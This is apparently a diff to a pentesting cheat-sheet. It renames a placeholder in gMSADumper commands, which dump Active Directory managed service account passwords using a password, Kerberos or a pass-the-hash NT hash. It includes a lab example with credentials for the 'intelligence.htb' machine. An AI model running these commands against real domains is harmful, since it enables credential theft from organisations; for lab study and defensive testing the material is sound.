@@ -9,7 +9,7 @@ https://github.com/micahvandeusen/gMSADumper
 Example: gMSADumper.py -u tiffany.molina -p NewIntelligenceCorpUser9876 -l 10.10.10.248  -d intelligence.htb
 
 ```
-gmsadumper -u <user> -p <password> -l <dc> -d <domain_fqdn> 
+gmsadumper -u <user> -p <password> -l <dc_fqdn> -d <domain_fqdn> 
 ```
 
 ## get passwords (kerberos auth)
@@ -17,7 +17,7 @@ gmsadumper -u <user> -p <password> -l <dc> -d <domain_fqdn>
 https://github.com/micahvandeusen/gMSADumper
 
 ```
-gmsadumper -k -l <dc> -d <domain_fqdn> 
+gmsadumper -k -l <dc_fqdn> -d <domain_fqdn> 
 ```
 
 ## get passwords (PtH auth)
@@ -25,6 +25,6 @@ gmsadumper -k -l <dc> -d <domain_fqdn>
 https://github.com/micahvandeusen/gMSADumper
 
 ```
-gmsadumper -u <user> -p <nt_hash> -l <dc> -d <domain_fqdn> 
+gmsadumper -u <user> -p <nt_hash> -l <dc_fqdn> -d <domain_fqdn> 
 ```
 
